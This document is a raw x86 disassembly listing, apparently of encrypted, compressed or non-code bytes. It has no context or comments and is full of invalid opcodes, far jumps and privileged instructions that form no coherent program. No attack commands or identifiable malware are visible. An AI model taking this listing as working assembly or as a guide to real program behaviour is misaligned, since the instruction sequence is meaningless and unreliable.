  40acd0:	enter  0x937e,0xda
  40acd4:	(bad)  
  40acd5:	(bad)  
  40acd6:	das    
  40acd7:	mov    esp,cs
  40acd9:	xor    al,0xc2
  40acdb:	push   ecx
  40acdc:	pop    esi
  40acdd:	(bad)  
  40acde:	cmp    BYTE PTR [edx+edx*8],dh
  40ace1:	std    
  40ace2:	arpl   WORD PTR [di],cx
  40ace5:	or     edx,DWORD PTR [edi-0x5d]
  40ace8:	loop   0x40ad23
  40acea:	ret    0x1343
  40aced:	mov    DWORD PTR [esi+0x5f9f12ad],eax
  40acf3:	and    DWORD PTR [ecx],esi
  40acf5:	sub    DWORD PTR [eax+0x52],edx
  40acf8:	mov    ds:0x3e1b558c,al
  40acfd:	sar    cl,0xd2
  40ad00:	(bad)  
  40ad01:	fbld   TBYTE PTR [ecx+0x57def247]
  40ad07:	sti    
  40ad08:	call   0x5de0:0x7aeb0b3e
  40ad0f:	push   edx
  40ad10:	iret   
  40ad11:	adc    al,0xae
  40ad13:	fstp   DWORD PTR ds:[edi]
  40ad16:	enter  0x6ff4,0x1
  40ad1a:	xchg   BYTE PTR [edx+0x62],cl
  40ad1d:	retf   0xe4e2
  40ad20:	(bad)  
  40ad21:	mov    ebx,0xa75f82d1
  40ad26:	dec    ebp
  40ad27:	js     0x40ad99
  40ad29:	nop
  40ad2a:	ret    0xa5a
  40ad2d:	add    al,0x11
  40ad2f:	mov    ebp,0xbe7d221f
  40ad34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad35:	arpl   WORD PTR [edi+0x2c16ca96],sp
  40ad3b:	push   esp
  40ad3c:	xor    ch,BYTE PTR [ecx-0x66]
  40ad3f:	arpl   WORD PTR [eax-0x4f],sp
  40ad42:	mov    ds:0x9102f963,al
  40ad47:	test   eax,0x5dd82d4b
  40ad4c:	inc    ebx
  40ad4d:	sahf   
  40ad4e:	outs   dx,BYTE PTR ds:[esi]
  40ad4f:	(bad)  
  40ad50:	test   DWORD PTR [edi],esp
  40ad52:	ds sub eax,0x59a63999
  40ad58:	test   eax,0x1e898ff5
  40ad5d:	adc    al,0xe5
  40ad5f:	cmp    al,0x14
  40ad61:	scas   al,BYTE PTR es:[edi]
  40ad62:	jmp    0xfe4a:0x5449a346
  40ad69:	pop    ebx
  40ad6a:	(bad)  
  40ad6b:	sub    eax,0x7d49b9a0
  40ad70:	aad    0xc3
  40ad72:	pop    ss
  40ad73:	retf   0x3564
  40ad76:	or     BYTE PTR [ecx-0x30],cl
  40ad79:	jmp    0x40acfb
  40ad7b:	pushf  
  40ad7c:	cld    
  40ad7d:	push   ebx
  40ad7e:	mov    al,0xcd
  40ad80:	or     eax,0x188419ab
  40ad85:	aas    
  40ad86:	int    0xe
  40ad88:	dec    ecx
  40ad89:	fstp   QWORD PTR [esi+edx*8+0x25]
  40ad8d:	or     DWORD PTR [edi+0x326d2d54],ebp
  40ad93:	xor    eax,0xd0655e92
  40ad98:	cmp    eax,0xc02b17ce
  40ad9d:	mov    ds:0x646ae810,al
  40ada2:	sub    eax,0x147d15b3
  40ada7:	int    0xd5
  40ada9:	fxch   st(6)
  40adab:	nop
  40adac:	ror    DWORD PTR [ebx-0x5b3f472f],cl
  40adb2:	push   es
  40adb3:	sbb    al,0xe6
  40adb5:	xlat   BYTE PTR ds:[ebx]
  40adb6:	inc    ebp
  40adb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adb8:	add    al,0x1d
  40adba:	xchg   BYTE PTR ds:0xb99bbd56,cl
  40adc0:	xor    DWORD PTR [esi-0x67],eax
  40adc3:	mov    edi,0x2b04b792
  40adc8:	xchg   ecx,eax
  40adc9:	lock cli 
  40adcb:	jp     0x40ad78
  40adcd:	push   ecx
  40adce:	shl    esi,1
  40add0:	addr16 adc esi,edx
  40add3:	test   BYTE PTR [ebp-0x151c1bcb],0x13
  40adda:	rcl    BYTE PTR [ebx-0x50b31943],1
  40ade0:	out    0x3f,al
  40ade2:	(bad)  
  40ade3:	xchg   ebx,eax
  40ade4:	push   cs
  40ade5:	mov    al,ds:0x25d6f382
  40adea:	jae    0x40adf9
  40adec:	or     al,0xf4
  40adee:	loop   0x40adbc
  40adf0:	nop
  40adf1:	ins    BYTE PTR es:[edi],dx
  40adf2:	lds    ebp,FWORD PTR ds:0x7dd34289
  40adf8:	xchg   edi,eax
  40adf9:	(bad)  
  40adfa:	jp     0x40ae76
  40adfc:	sub    dh,BYTE PTR [ebp+0x32]
  40adff:	loope  0x40ad9b
  40ae01:	lea    esp,[ebp+0x9]
  40ae04:	fsub   QWORD PTR [eax+0x29]
  40ae07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae08:	mov    al,ds:0xbb535e31
  40ae0d:	add    bl,BYTE PTR [ecx]
  40ae0f:	ret    0x3b09
  40ae12:	sbb    al,0x39
  40ae14:	cs jno 0x40ae4b
  40ae17:	dec    ebp
  40ae18:	or     dl,BYTE PTR [ecx+0x5c]
  40ae1b:	cmp    dl,bl
  40ae1d:	push   esp
  40ae1e:	clc    
  40ae1f:	sbb    eax,0x15273008
  40ae24:	xor    al,0x29
  40ae26:	je     0x40ade0
  40ae28:	push   0x49a740c
  40ae2d:	cmp    edx,ebp
  40ae2f:	jo     0x40ae43
  40ae31:	(bad)  
  40ae32:	and    cl,BYTE PTR [esi+ecx*1-0x33]
  40ae36:	and    ebp,esi
  40ae38:	inc    ebx
  40ae39:	in     eax,0x21
  40ae3b:	fild   WORD PTR [edi]
  40ae3d:	icebp  
  40ae3e:	pop    ss
  40ae3f:	push   eax
  40ae40:	cmp    al,0x87
  40ae42:	sub    bl,bh
  40ae44:	fist   WORD PTR [eax+0x6032c2b7]
  40ae4a:	adc    BYTE PTR ds:0xc6bdbddc,dl
  40ae50:	in     al,0x98
  40ae52:	jg     0x40aded
  40ae54:	xor    ch,ch
  40ae56:	lea    edi,[ebx-0x2c]
  40ae59:	(bad)  [ebp-0x8a09464]
  40ae5f:	mov    eax,ds:0x24bd84a1
  40ae64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae65:	cmp    esi,ecx
  40ae67:	push   ecx
  40ae68:	xchg   edi,eax
  40ae69:	or     bh,ch
  40ae6b:	push   eax
  40ae6c:	adc    edi,edi
  40ae6e:	cmc    
  40ae6f:	jmp    0x9896:0x14aee803
  40ae76:	sti    
  40ae77:	(bad)  
  40ae79:	repz mov bh,0x4f
  40ae7c:	push   ecx
  40ae7d:	add    eax,0xe87797e7
  40ae82:	dec    esi
  40ae83:	fmul   QWORD PTR [esi+ecx*4]
  40ae86:	pop    ecx
  40ae87:	call   0xe04:0x4c23f520
  40ae8e:	sub    DWORD PTR ds:0x9d7bfb03,ecx
  40ae94:	cmp    esp,ecx
  40ae96:	test   eax,0xf996eb95
  40ae9b:	es jo  0x40aecc
  40ae9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae9f:	sub    BYTE PTR [ebp+0x52bba829],bh
  40aea5:	hlt    
  40aea6:	and    BYTE PTR [ebx-0x7979e533],bh
  40aeac:	lods   al,BYTE PTR ds:[esi]
  40aead:	add    DWORD PTR [esi+esi*8-0x2d],ecx
  40aeb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aeb2:	add    BYTE PTR [esi],dl
  40aeb4:	mov    esi,0x963cb56
  40aeb9:	push   eax
  40aeba:	and    esi,DWORD PTR [ecx-0x6c800de3]
  40aec0:	aad    0x86
  40aec2:	inc    esi
  40aec3:	aam    0xa9
  40aec5:	add    al,0x47
  40aec7:	cdq    
  40aec8:	mov    esi,0x5797eec1
  40aecd:	fwait
  40aece:	lea    ebp,[esi-0x3f2b28bb]
  40aed4:	xchg   BYTE PTR [ecx+edi*1+0x49],cl
  40aed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aed9:	lds    ecx,FWORD PTR [ecx-0x5d]
  40aedc:	sbb    esp,ecx
  40aede:	mov    ds:0xb46c58c7,eax
  40aee3:	mov    cl,0xd
  40aee5:	mov    dl,0xe6
  40aee7:	test   eax,0x4d6f1602
  40aeec:	jmp    0x304f:0x3881c06c
  40aef3:	popf   
  40aef4:	add    eax,0xbf02905
  40aef9:	rcr    DWORD PTR [edx],cl
  40aefb:	out    dx,al
  40aefc:	cmp    ah,ah
  40aefe:	inc    eax
  40aeff:	add    bh,BYTE PTR [ecx-0x75]
  40af02:	xchg   bl,dh
  40af04:	(bad)  
  40af05:	out    dx,eax
  40af06:	lahf   
  40af07:	push   edi
  40af08:	(bad)  
  40af09:	cli    
  40af0a:	jb     0x40aecb
  40af0c:	popa   
  40af0d:	jl     0x40af35
  40af0f:	dec    eax
  40af10:	cdq    
  40af11:	push   esi
  40af12:	pop    edi
  40af13:	(bad)
  40af16:	adc    al,BYTE PTR [edx+0x77]
  40af19:	lea    eax,[ebx-0x623792d4]
  40af1f:	sub    esi,edx
  40af21:	sub    eax,0x3ae6045f
  40af26:	shl    ah,0x19
  40af29:	add    ch,BYTE PTR [ebp-0x20]
  40af2c:	cmp    bl,dl
  40af2e:	adc    al,0xef
  40af30:	mov    BYTE PTR [edx+0x38],cl
  40af33:	scas   eax,DWORD PTR es:[edi]
  40af34:	jns    0x40afb5
  40af36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af37:	stc    
  40af38:	repnz sub al,0x37
  40af3b:	and    BYTE PTR [ebx-0x2],bl
  40af3e:	inc    ecx
  40af3f:	mov    ebp,0x439d8255
  40af44:	dec    ecx
  40af45:	imul   edi,DWORD PTR [esi-0x73280e1b],0xa5deab0b
  40af4f:	cld    
  40af50:	popa   
  40af51:	inc    ebx
  40af52:	mov    cl,0x8b
  40af54:	sbb    cl,al
  40af56:	mov    ecx,0x6bfada81
  40af5b:	cmp    dl,cl
  40af5d:	aad    0x5e
  40af5f:	sbb    eax,0xd8c29de0
  40af64:	mov    cl,0xa9
  40af66:	and    eax,0x6fa33ecd
  40af6b:	(bad)  
  40af6c:	xlat   BYTE PTR ds:[ebx]
  40af6d:	add    DWORD PTR [ecx-0x2e],edi
  40af70:	inc    edx
  40af71:	into   
  40af72:	clc    
  40af73:	inc    ecx
  40af74:	int    0x8f
  40af76:	dec    edx
  40af77:	enter  0xad4e,0xc5
  40af7b:	cli    
  40af7c:	mov    ebp,0x4fc731c6
  40af81:	jne    0x40afde
  40af83:	hlt    
  40af84:	or     BYTE PTR [eax-0x438f4fd7],cl
  40af8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af8b:	mov    ah,ch
  40af8d:	xor    bh,0xe0
  40af90:	cli    
  40af91:	cmp    eax,0xc86f5bc9
  40af96:	pushf  
  40af97:	and    al,0xbc
  40af99:	ja     0x40af5e
  40af9b:	jle    0x40afe8
  40af9d:	shl    dh,1
  40af9f:	pop    edi
  40afa0:	(bad)  
  40afa1:	cmp    ch,dl
  40afa3:	fs pop esp
  40afa5:	and    dl,BYTE PTR [esi-0x48]
  40afa8:	cmc    
  40afa9:	adc    cl,BYTE PTR [edi-0x3eba6dbf]
  40afaf:	gs hlt 
  40afb1:	add    edi,DWORD PTR [ebx-0x6a7f758a]
  40afb7:	cdq    
  40afb8:	jge    0x40af5b
  40afba:	leave  
  40afbb:	aas    
  40afbc:	or     DWORD PTR [ebp-0x5],ecx
  40afbf:	mov    ds:0x2767e716,al
  40afc4:	(bad)
  40afc7:	adc    al,0x68
  40afc9:	jp     0x40afa9
  40afcb:	xor    eax,0xe0ba60a5
  40afd0:	push   esi
  40afd1:	cli    
  40afd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afd3:	sub    dh,BYTE PTR [edx-0x7c4882a6]
  40afd9:	inc    esi
  40afda:	dec    esi
  40afdb:	sbb    eax,0x66bfe653
  40afe0:	mov    ecx,DWORD PTR [ebp+0x74]
  40afe3:	xor    ebx,DWORD PTR [ebx+0x4f]
  40afe6:	stc    
  40afe7:	loopne 0x40afd1
  40afe9:	and    esi,DWORD PTR [bx+di+0x4156]
  40afee:	mov    ebx,0x2d1758e1
  40aff3:	mov    edx,0x9a87d26e
  40aff8:	and    BYTE PTR [ebx],ah
  40affa:	push   edi
  40affb:	xchg   ebx,eax
  40affc:	xchg   DWORD PTR [ebp+0x7b250470],ecx
  40b002:	push   es
  40b003:	(bad)  
  40b004:	mov    bl,0x0
  40b006:	enter  0x2188,0xd3
  40b00a:	dec    edx
  40b00b:	mov    ah,0x3e
  40b00d:	outs   dx,BYTE PTR ds:[esi]
  40b00e:	sub    BYTE PTR [edx],cl
  40b010:	add    BYTE PTR [edi],al
  40b012:	push   esp
  40b013:	cmc    
  40b014:	aaa    
  40b015:	sbb    DWORD PTR [edx-0x696ba5a9],edx
  40b01b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b01c:	push   esp
  40b01d:	nop
  40b01e:	add    BYTE PTR [ebx+0x4],dl
  40b021:	ins    DWORD PTR es:[edi],dx
  40b022:	xor    esp,DWORD PTR [edx-0x10]
  40b025:	mov    edx,0xf8de859d
  40b02a:	xor    dh,bl
  40b02c:	add    eax,DWORD PTR [ecx-0x78]
  40b02f:	mov    ds:0x5e42a2a0,al
  40b034:	out    0x5b,al
  40b036:	push   cs
  40b037:	and    dh,BYTE PTR [eax-0x64]
  40b03a:	sbb    ch,0xce
  40b03d:	out    dx,eax
  40b03e:	pop    ebx
  40b03f:	xchg   BYTE PTR [eax-0x66622f5],bl
  40b045:	mov    ch,BYTE PTR [ecx-0x72]
  40b048:	sbb    ecx,DWORD PTR [esi]
  40b04a:	jae    0x40b01e
  40b04c:	xchg   ecx,eax
  40b04d:	pusha  
  40b04e:	mov    WORD PTR [ecx+eax*1],fs
  40b051:	sbb    al,BYTE PTR [edx+0x22]
  40b054:	mov    dl,0x8c
  40b056:	xchg   esi,eax
  40b057:	mov    cl,0xa3
  40b059:	(bad)  
  40b05a:	out    dx,al
  40b05b:	xor    ebx,DWORD PTR [edx+eax*2-0x3293c82d]
  40b062:	add    dl,al
  40b064:	pop    esi
  40b065:	loopne 0x40b037
  40b067:	fwait
  40b068:	jno    0x40b06b
  40b06a:	jmp    0x186c:0x5320e952
  40b071:	jecxz  0x40b0ce
  40b073:	push   edi
  40b074:	push   cs
  40b075:	cli    
  40b076:	sbb    al,0x8b
  40b078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b079:	xchg   DWORD PTR [esi],ebp
  40b07b:	retf   0xb6f9
  40b07e:	in     al,0x13
  40b080:	test   eax,0xb3023e2f
  40b085:	push   ds
  40b086:	rcr    DWORD PTR [esi*1+0x5ecfb4ae],0xc8
  40b08e:	xchg   edi,eax
  40b08f:	pop    esp
  40b090:	sub    BYTE PTR [ebp-0x435be368],dh
  40b096:	mov    ds:0x3dc7e860,al
  40b09b:	sub    DWORD PTR [edi+ebp*4+0x833b084],ecx
  40b0a2:	jbe    0x40b0de
  40b0a4:	mov    WORD PTR [edx+0x4ab22de5],ds
  40b0aa:	push   ss
  40b0ab:	xlat   BYTE PTR ds:[ebx]
  40b0ac:	lds    edx,FWORD PTR [eax-0x5d1887bb]
  40b0b2:	sbb    DWORD PTR [ebp-0x74],esp
  40b0b5:	(bad)  
  40b0b6:	hlt    
  40b0b7:	sub    al,0x8f
  40b0b9:	pushf  
  40b0ba:	dec    edi
  40b0bb:	cmp    ebp,edi
  40b0bd:	in     eax,dx
  40b0be:	les    eax,FWORD PTR ds:0xc3fb452d
  40b0c4:	enter  0xa852,0xe8
  40b0c8:	push   edi
  40b0c9:	mov    al,ds:0x929faf82
  40b0ce:	mov    bl,0xe4
  40b0d0:	sub    al,0x97
  40b0d2:	jns    0x40b0b4
  40b0d4:	or     bl,BYTE PTR [ebx+0x3541a79a]
  40b0da:	adc    al,0x64
  40b0dc:	adc    eax,0xa894aa55
  40b0e1:	fwait
  40b0e2:	call   0x99c5fac
  40b0e7:	adc    ebp,DWORD PTR [edi+0x3061747c]
  40b0ed:	ins    DWORD PTR es:[edi],dx
  40b0ee:	lock ss jp 0x40b0be
  40b0f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0f3:	pop    ss
  40b0f4:	lahf   
  40b0f5:	in     eax,dx
  40b0f6:	loopne 0x40b09f
  40b0f8:	mov    al,ds:0xd1e1ed58
  40b0fd:	outs   dx,BYTE PTR ds:[esi]
  40b0fe:	cmp    cl,BYTE PTR [ebp+eax*1-0x54]
  40b102:	cmp    al,0xc1
  40b104:	das    
  40b105:	push   esi
  40b106:	pushf  
  40b107:	mov    al,BYTE PTR [esi-0x34b0753a]
  40b10d:	mov    ebx,DWORD PTR [eax-0x14]
  40b110:	jg     0x40b148
  40b112:	or     ebp,DWORD PTR [esi+0x7d41b986]
  40b118:	jg     0x40b0a0
  40b11a:	xchg   edx,eax
  40b11b:	into   
  40b11c:	lahf   
  40b11d:	cmp    cl,al
  40b11f:	aam    0x3a
  40b121:	mov    al,0xac
  40b123:	sub    ah,BYTE PTR [ebx+0x62]
  40b126:	cmp    al,0x30
  40b128:	clc    
  40b129:	loopne 0x40b15c
  40b12b:	(bad)  
  40b12c:	fst    QWORD PTR [edi-0x4a]
  40b12f:	lds    esi,FWORD PTR [esi]
  40b131:	pop    es
  40b132:	rcl    bh,0x5c
  40b135:	and    ah,bl
  40b137:	fisub  WORD PTR [eax]
  40b139:	xor    ch,BYTE PTR [eax]
  40b13b:	jg     0x40b1b4
  40b13d:	mov    esi,0x74516287
  40b142:	push   ebp
  40b143:	in     al,dx
  40b144:	mov    ebp,0x230be956
  40b149:	test   al,0x28
  40b14b:	sub    eax,0x96b6ed43
  40b150:	sbb    al,0x19
  40b152:	xchg   BYTE PTR [ebp-0x2c],ch
  40b155:	js     0x40b0f8
  40b157:	inc    ebp
  40b158:	jmp    0x8b34:0x6daf2f52
  40b15f:	xchg   edi,eax
  40b160:	mov    ch,BYTE PTR es:[edi+0x2a00c669]
  40b167:	jle    0x40b185
  40b169:	pop    ebp
  40b16a:	dec    esi
  40b16b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b16c:	imul   edi,ebx,0x29
  40b16f:	sbb    eax,0xc55feaf6
  40b174:	dec    ebx
  40b175:	jmp    0x8e1a:0xef9a20d8
  40b17c:	scas   eax,DWORD PTR es:[edi]
  40b17d:	mov    bl,0xc
  40b17f:	fs loope 0x40b179
  40b182:	test   al,0xcb
  40b184:	ret    
  40b185:	and    DWORD PTR ds:0x7ed1ba5f,eax
  40b18b:	xor    eax,0xe2bd49b9
  40b190:	imul   edi,DWORD PTR [edi+0x6f6a6545],0x797fe727
  40b19a:	push   es
  40b19b:	dec    edx
  40b19c:	out    dx,al
  40b19d:	mov    eax,ds:0x384e9a90
  40b1a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1a3:	out    0x79,al
  40b1a5:	in     al,dx
  40b1a6:	cmp    ebx,DWORD PTR [eax-0x12]
  40b1a9:	mov    ah,0x4e
  40b1ab:	sbb    DWORD PTR [ecx-0x1b3b3d1b],ecx
  40b1b1:	push   ebp
  40b1b2:	ss jmp 0x40b17f
  40b1b5:	into   
  40b1b6:	push   ebp
  40b1b7:	fisttp WORD PTR [ecx+0x9]
  40b1ba:	add    eax,0x58a750bd
  40b1bf:	loope  0x40b235
  40b1c1:	sbb    BYTE PTR [ecx+0x7a],cl
  40b1c4:	nop
  40b1c5:	(bad)
  40b1c8:	and    bl,BYTE PTR [edx]
  40b1ca:	outs   dx,BYTE PTR ds:[esi]
  40b1cb:	mov    al,0xe1
  40b1cd:	bound  edi,QWORD PTR [edi+edx*8+0x61867725]
  40b1d4:	int3   
  40b1d5:	dec    eax
  40b1d6:	pop    ebp
  40b1d7:	add    bh,BYTE PTR [eax+0xfe75da]
  40b1dd:	div    BYTE PTR [ebp-0x2f3d7f33]
  40b1e3:	dec    esi
  40b1e4:	push   cs
  40b1e5:	int    0x40
  40b1e7:	sbb    eax,0x16af2d90
  40b1ec:	sub    dl,bl
  40b1ee:	ds retf 0x8941
  40b1f2:	jnp    0x40b186
  40b1f4:	daa    
  40b1f5:	fld    QWORD PTR [esi]
  40b1f7:	out    dx,al
  40b1f8:	dec    eax
  40b1f9:	loop   0x40b22c
  40b1fb:	inc    ebx
  40b1fc:	push   ds
  40b1fd:	repz imul ebp,DWORD PTR [ebx],0x5e
  40b201:	out    0x54,eax
  40b203:	cmp    esp,esi
  40b205:	cmp    DWORD PTR [ebp-0x79],ecx
  40b208:	jg     0x40b193
  40b20a:	rcr    DWORD PTR [esi+ebx*2],1
  40b20d:	adc    BYTE PTR [edx],0x6f
  40b210:	mov    edx,0x5d0942c5
  40b215:	sbb    eax,0xbbe69ab7
  40b21a:	data16 and BYTE PTR cs:[ecx+0xd],dh
  40b21f:	mov    cs,WORD PTR [ecx+0x346d1370]
  40b225:	ja     0x40b228
  40b227:	and    BYTE PTR [edi+0x42c090d9],ch
  40b22d:	lea    ecx,[edx-0x1dcc3321]
  40b233:	cs jnp 0x40b200
  40b236:	xor    eax,0x9553f6aa
  40b23b:	push   es
  40b23c:	push   0x2b
  40b23e:	mov    BYTE PTR [eax-0x4d],bl
  40b241:	push   esi
  40b242:	push   0x30
  40b244:	stc    
  40b245:	out    dx,al
  40b246:	jmp    0x2df8:0xae9e58f2
  40b24d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b24e:	test   BYTE PTR [edi-0x7b],bh
  40b251:	sbb    eax,0x60199f62
  40b256:	push   0xa
  40b258:	inc    esp
  40b259:	sub    eax,0x4c905389
  40b25e:	push   ecx
  40b25f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b260:	xlat   BYTE PTR ds:[ebx]
  40b261:	cmp    dh,BYTE PTR [ebx+0x1ddf7abc]
  40b267:	stos   DWORD PTR es:[edi],eax
  40b268:	div    DWORD PTR [edx]
  40b26a:	push   ebp
  40b26b:	sbb    BYTE PTR [ebx-0x2ecc9163],bh
  40b271:	sbb    DWORD PTR [edi-0x76],0x1a
  40b275:	pop    ebx
  40b276:	push   es
  40b277:	out    0xa9,eax
  40b279:	sar    bh,0xf
  40b27c:	push   ebx
  40b27d:	lahf   
  40b27e:	cmp    al,0xb9
  40b280:	xchg   ebp,eax
  40b281:	icebp  
  40b282:	adc    BYTE PTR [ebx-0x7c3e7958],ch
  40b288:	xor    BYTE PTR [ebx+0x132d6caf],al
  40b28e:	in     al,0xc7
  40b290:	arpl   WORD PTR [edi],di
  40b292:	(bad)  
  40b293:	loop   0x40b2b1
  40b295:	mov    dl,0xaa
  40b297:	sub    BYTE PTR [edx+0x71],ch
  40b29a:	(bad)  
  40b29c:	sub    ebp,edi
  40b29e:	stc    
  40b29f:	sub    DWORD PTR [esp+ebx*1],esi
  40b2a2:	jp     0x40b2b1
  40b2a4:	popf   
  40b2a5:	aas    
  40b2a6:	and    BYTE PTR [ecx+0x39780660],cl
  40b2ac:	jbe    0x40b2d5
  40b2ae:	jb     0x40b2b5
  40b2b0:	fisttp DWORD PTR [edi-0x35555ba]
  40b2b6:	xchg   esi,eax
  40b2b7:	mov    ebp,0x58e86b88
  40b2bc:	aas    
  40b2bd:	fst    st(7)
  40b2bf:	shl    DWORD PTR [esi-0x2eaa4d17],cl
  40b2c5:	jns    0x40b2be
  40b2c7:	pop    edx
  40b2c8:	mov    esi,0x95e0ef1b
  40b2cd:	stc    
  40b2ce:	xor    al,0x66
  40b2d0:	add    eax,0x48017b82
  40b2d5:	add    al,0x49
  40b2d7:	popa   
  40b2d8:	or     eax,0xe640ce18
  40b2dd:	dec    edx
  40b2de:	icebp  
  40b2df:	mov    ecx,0x8b264d99
  40b2e4:	cmp    eax,0xdb591938
  40b2e9:	in     al,dx
  40b2ea:	push   ss
  40b2eb:	inc    esi
  40b2ec:	dec    edi
  40b2ed:	cmp    ebx,DWORD PTR [esi+edx*4-0x7ff92aaa]
  40b2f4:	xchg   ecx,eax
  40b2f5:	repnz ins DWORD PTR es:[edi],dx
  40b2f7:	sub    BYTE PTR [eax],ch
  40b2f9:	ins    DWORD PTR es:[edi],dx
  40b2fa:	or     eax,0xfffffff4
  40b2fd:	stc    
  40b2fe:	adc    bl,BYTE PTR [esi]
  40b300:	clc    
  40b301:	bound  edx,QWORD PTR [edx]
  40b303:	jle    0x40b326
  40b305:	push   ebp
  40b306:	lods   al,BYTE PTR ds:[esi]
  40b307:	mov    esi,0x4f2b1c0d
  40b30c:	shr    DWORD PTR [eax],0x6
  40b30f:	add    al,BYTE PTR [esi+0x3d]
  40b312:	mov    dl,BYTE PTR [edx]
  40b314:	xchg   ecx,eax
  40b315:	out    0x3f,eax
  40b317:	jo     0x40b33f
  40b319:	xchg   edi,eax
  40b31a:	aam    0xed
  40b31c:	jge    0x40b308
  40b31e:	pop    ebp
  40b31f:	adc    edx,ecx
  40b321:	mov    dh,0xbf
  40b323:	mov    bh,0x74
  40b325:	out    dx,eax
  40b326:	xchg   DWORD PTR [edi+0x686e87a9],ebx
  40b32c:	outs   dx,BYTE PTR ds:[esi]
  40b32d:	mov    bl,0xd0
  40b32f:	imul   ecx,eax,0xb
  40b332:	mov    al,ds:0xd4655df4
  40b337:	inc    ebx
  40b338:	sbb    eax,0xdaec1d0b
  40b33d:	jp     0x40b34c
  40b33f:	push   ebp
  40b340:	sub    edx,edi
  40b342:	dec    esi
  40b343:	or     al,0xe9
  40b345:	dec    eax
  40b346:	pop    edx
  40b347:	es ja  0x40b319
  40b34a:	lods   al,BYTE PTR ds:[esi]
  40b34b:	iret   
  40b34c:	sbb    esp,DWORD PTR [ebx]
  40b34e:	test   edi,eax
  40b350:	out    dx,al
  40b351:	add    edx,DWORD PTR [ebp-0x3a32c6ff]
  40b357:	leave  
  40b358:	int    0xa4
  40b35a:	push   edx
  40b35b:	repnz shl BYTE PTR [ecx],cl
  40b35e:	or     BYTE PTR [ebx+0x3e48981e],0xe0
  40b365:	dec    esi
  40b366:	addr16 sub eax,0xd9687aed
  40b36c:	retf   0x9c6a
  40b36f:	mov    al,0xb7
  40b371:	sbb    al,0xcd
  40b373:	push   cs
  40b374:	pushf  
  40b375:	pusha  
  40b376:	je     0x40b3a9
  40b378:	arpl   WORD PTR [ebx+0x3f589307],sp
  40b37e:	leave  
  40b37f:	push   ss
  40b380:	push   ecx
  40b381:	cmp    DWORD PTR [edx+ebx*2+0x11],ecx
  40b385:	add    DWORD PTR [edx+edi*8],esi
  40b388:	das    
  40b389:	xor    al,0x25
  40b38b:	cmp    al,0x3b
  40b38d:	mov    bl,0x59
  40b38f:	ins    DWORD PTR es:[edi],dx
  40b390:	push   0xffffff8c
  40b392:	add    ah,ch
  40b394:	push   esp
  40b395:	mov    bl,0xc2
  40b397:	ds pop esi
  40b399:	push   cs
  40b39a:	stos   BYTE PTR es:[edi],al
  40b39b:	sbb    edi,DWORD PTR [ebx]
  40b39d:	(bad)  
  40b39e:	shr    BYTE PTR [eax+0x11],1
  40b3a1:	(bad)
  40b3a5:	mov    ss,WORD PTR [ebp-0x3e5f6932]
  40b3ab:	shr    BYTE PTR [edi-0x46b75a65],1
  40b3b1:	xor    al,0xbf
  40b3b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3b4:	clc    
  40b3b5:	ins    DWORD PTR es:[edi],dx
  40b3b6:	lods   eax,DWORD PTR ds:[esi]
  40b3b7:	arpl   WORD PTR [ebx-0x51],cx
  40b3ba:	out    0xdf,al
  40b3bc:	mov    ebp,0xd183e1cd
  40b3c1:	push   esp
  40b3c2:	mov    ch,0xf1
  40b3c4:	and    al,0xa8
  40b3c6:	lods   eax,DWORD PTR ds:[esi]
  40b3c7:	retf   0x91d6
  40b3ca:	pusha  
  40b3cb:	sbb    BYTE PTR ds:[edx-0x44],al
  40b3cf:	push   es
  40b3d0:	psubsb mm3,QWORD PTR [ebp+0x39]
  40b3d4:	add    al,dl
  40b3d6:	or     esp,DWORD PTR [edx+ecx*2-0x63bfe3b2]
  40b3dd:	sar    dh,1
  40b3df:	shl    DWORD PTR [ebp+0x23990ae9],1
  40b3e5:	cmp    al,0x64
  40b3e7:	mov    cl,0xee
  40b3e9:	pop    eax
  40b3ea:	stc    
  40b3eb:	jbe    0x40b453
  40b3ed:	xchg   BYTE PTR [edi],dl
  40b3ef:	inc    edi
  40b3f0:	mov    dl,al
  40b3f2:	pop    ebp
  40b3f3:	daa    
  40b3f4:	jbe    0x40b468
  40b3f6:	add    DWORD PTR [edx],0x1d
  40b3f9:	add    al,0x9d
  40b3fb:	in     eax,0x45
  40b3fd:	or     DWORD PTR [ecx+0x6fa029],0xffffffe4
  40b404:	xor    DWORD PTR [ecx],edx
  40b406:	mov    esi,0xc3862afd
  40b40b:	xchg   ebp,eax
  40b40c:	mov    ecx,0xb906ff97
  40b411:	inc    edi
  40b412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b413:	ror    bl,0x9
  40b416:	add    bl,BYTE PTR [esi+ebx*1-0x33]
  40b41a:	pop    ecx
  40b41b:	mov    cl,0x38
  40b41d:	pop    esp
  40b41e:	and    al,0x6a
  40b420:	dec    ecx
  40b421:	jbe    0x40b45d
  40b423:	pushf  
  40b424:	add    ebx,DWORD PTR [ebp+0x5b87a25b]
  40b42a:	cmp    eax,0xde525008
  40b42f:	or     dl,BYTE PTR [edx-0x6c]
  40b432:	pop    ss
  40b433:	jge    0x40b3f6
  40b435:	mov    al,0xd2
  40b437:	mov    ecx,0x89f9bad0
  40b43c:	aam    0x33
  40b43e:	add    al,BYTE PTR [ebx+0x26]
  40b441:	jb     0x40b421
  40b443:	aam    0xcb
  40b445:	xor    BYTE PTR [ebx-0x3ab74dc3],al
  40b44b:	and    bh,BYTE PTR [ebp+0x1d75b35e]
